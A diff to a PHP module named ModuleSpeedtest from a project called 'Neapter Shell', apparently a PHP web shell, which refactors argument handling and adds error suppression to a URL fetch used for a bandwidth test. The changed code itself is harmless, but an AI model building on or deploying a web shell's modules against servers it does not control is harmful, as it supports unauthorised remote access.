@@ -4,39 +4,22 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
 
 /**
- * ModuleSpeedtest - Test predkosci
+ * Test predkosci lacza
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Modules
  */
-class ModuleSpeedtest implements ShellInterface
+class ModuleSpeedtest extends ModuleAbstract
 {
-	/**
-	 * Obiekt Shell
-	 *
-	 * @access private
-	 * @var    object
-	 */
-	private $oShell;
-
-	/**
-	 * Konstruktor
-	 *
-	 * @access public
-	 * @param  object $oShell Obiekt Shell
-	 * @return void
-	 */
-	public function __construct( Shell $oShell )
-	{
-		$this -> oShell = $oShell;
-	}
-
 	/**
 	 * Dostepna lista komend
 	 *
@@ -95,15 +78,17 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc !== 1 )
+		if( $this -> oShell -> getArgs() -> getNumberOfParams() !== 1 )
 		{
 			return $this -> getHelp();
 		}
 
+		$sParam = $this -> oShell -> getArgs() -> getParam( 0 );
+
 		/**
 		 * Wspierany jest tylko protokul HTTP
 		 */
-		if( strncmp( $this -> oShell -> aArgv[0], 'http://', 7 ) !== 0 )
+		if( strncmp( $sParam, 'http://', 7 ) !== 0 )
 		{
 			return 'Wspierany jest tylko protokół http!';
 		}
@@ -124,7 +109,7 @@ DATA;
 		/**
 		 * Otwieranie polaczenia
 		 */
-		if( ( $rFp = fopen( $this -> oShell -> aArgv[0], 'r', FALSE, stream_context_create( $aStream ) ) ) === FALSE )
+		if( ( $rFp = @ fopen( $sParam, 'r', FALSE, stream_context_create( $aStream ) ) ) === FALSE )
 		{
 			return 'Nie można pobrać pliku';
 		}
